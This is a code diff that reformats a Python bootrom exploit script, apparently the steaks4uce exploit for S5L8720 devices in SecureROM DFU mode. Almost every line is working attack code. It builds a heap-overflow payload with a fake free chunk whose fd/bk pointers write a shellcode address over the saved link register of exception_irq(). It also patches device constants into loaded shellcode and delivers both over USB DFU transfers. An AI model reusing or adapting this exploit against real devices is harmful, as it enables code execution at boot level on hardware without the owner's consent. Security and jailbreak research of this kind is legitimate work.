@@ -78,41 +78,50 @@ configs = [
 
 # Pad to length 256 and add heap data for overwrite
 payload = b'\x00' * 256 + struct.pack('<14I',
-                                     # 1. Allocated chunk to be freed
-                                     # Chunk header: (size 0x8)
-                                     0x84,  # 0x00: previous_chunk
-                                     0x5,  # 0x04: next_chunk
-                                     # Contents: (requested size 0x1c, allocated size 0x20)
-                                     0x80,  # 0x08: buffer[0] - direction
-                                     0x22026280,  # 0x0c: buffer[1] - usb_response_buffer
-                                     0xffffffff,  # 0x10: buffer[2]
-                                     0x138,  # 0x14: buffer[3] - size of payload in bytes
-                                     0x100,  # 0x18: buffer[4]
-                                     0x0,  # 0x1c: buffer[5]
-                                     0x0,  # 0x20: buffer[6]
-                                     0x0,  # 0x24: unused
-                                     # 2. Fake free chunk
-                                     # Chunk header: (size 0x8)
-                                     0x15,  # 0x28: previous_chunk
-                                     0x2,  # 0x2c: next_chunk
-                                     # Attack fd/bk pointers in this free chunk for arbitrary write:
-                                     0x22000001,  # 0x30: fd - shellcode_address (what to write)
-                                     0x2202d7fc,  # 0x34: bk - exception_irq() LR on the stack (where to write it)
-                                     )
+                                      # 1. Allocated chunk to be freed
+                                      # Chunk header: (size 0x8)
+                                      0x84,  # 0x00: previous_chunk
+                                      0x5,  # 0x04: next_chunk
+                                      # Contents: (requested size 0x1c,
+                                      # allocated size 0x20)
+                                      0x80,  # 0x08: buffer[0] - direction
+                                      0x22026280,
+                                      # 0x0c: buffer[1] - usb_response_buffer
+                                      0xffffffff,  # 0x10: buffer[2]
+                                      0x138,
+                                      # 0x14: buffer[3] - size of payload in
+                                      # bytes
+                                      0x100,  # 0x18: buffer[4]
+                                      0x0,  # 0x1c: buffer[5]
+                                      0x0,  # 0x20: buffer[6]
+                                      0x0,  # 0x24: unused
+                                      # 2. Fake free chunk
+                                      # Chunk header: (size 0x8)
+                                      0x15,  # 0x28: previous_chunk
+                                      0x2,  # 0x2c: next_chunk
+                                      # Attack fd/bk pointers in this free
+                                      # chunk for arbitrary write:
+                                      0x22000001,
+                                      # 0x30: fd - shellcode_address (what to
+                                      # write)
+                                      0x2202d7fc,  # 0x34: bk - exception_irq() LR on the stack (where to write it)
+                                      )
 
 
 def generate_shellcode(constants):
     with open('bin/steaks4uce-shellcode.bin', 'rb') as f:
         shellcode = f.read()
 
-    # Shellcode has placeholder values for constants; check they match and replace with constants from config
+    # Shellcode has placeholder values for constants; check they match and
+    # replace with constants from config
     placeholders_offset = len(shellcode) - 4 * len(constants)
     for i in range(len(constants)):
         offset = placeholders_offset + 4 * i
         (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
         assert value == 0xBAD00001 + i
 
-    return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
+    return shellcode[:placeholders_offset] + \
+        struct.pack('<%sI' % len(constants), *constants)
 
 
 def exploit():
@@ -129,21 +138,29 @@ def exploit():
         print('ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.')
         sys.exit(1)
 
-    chosenConfig = None
+    chosen_config = None
     for config in configs:
         if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
-            chosenConfig = config
+            chosen_config = config
             break
 
-    if chosenConfig is None:
+    if chosen_config is None:
         print('ERROR: CPID is compatible, but serial number string does not match.')
-        print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
+        print(
+            'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
         sys.exit(1)
 
     dfu.reset_counters(device)
-    dfu.send_data(device, generate_shellcode(chosenConfig.constants))
+    dfu.send_data(device, generate_shellcode(chosen_config.constants))
     dfu.send_data(device, payload)
-    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)) == len(payload)
+    assert len(
+        device.ctrl_transfer(
+            0xA1,
+            1,
+            0,
+            0,
+            len(payload),
+            1000)) == len(payload)
     dfu.release_device(device)
 
     time.sleep(0.01)
